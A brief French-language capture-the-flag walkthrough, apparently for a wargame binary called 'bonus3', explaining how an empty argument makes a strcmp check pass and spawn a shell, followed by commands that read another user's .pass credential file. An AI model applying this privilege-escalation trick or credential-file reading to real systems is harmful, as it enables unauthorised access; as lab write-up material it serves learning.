l'exploit est tres simple
dans le code source il y a buf[atoi(argv[1])] = 0;

puis
if (strcmp(&buf, argv[1]))
    puts(&var_56);
else
    execl("/bin/sh", "sh", 0);

donc si buf est argv[1] sont identique on accede a un shell

il suffit donc de taper :

./bonus3 ""

pour faire sorte que argv[1] = \0
buf[0] = 0

donc buff = argv[1] ca nous donne acces au shell

whoami
cat /home/user/end/.pass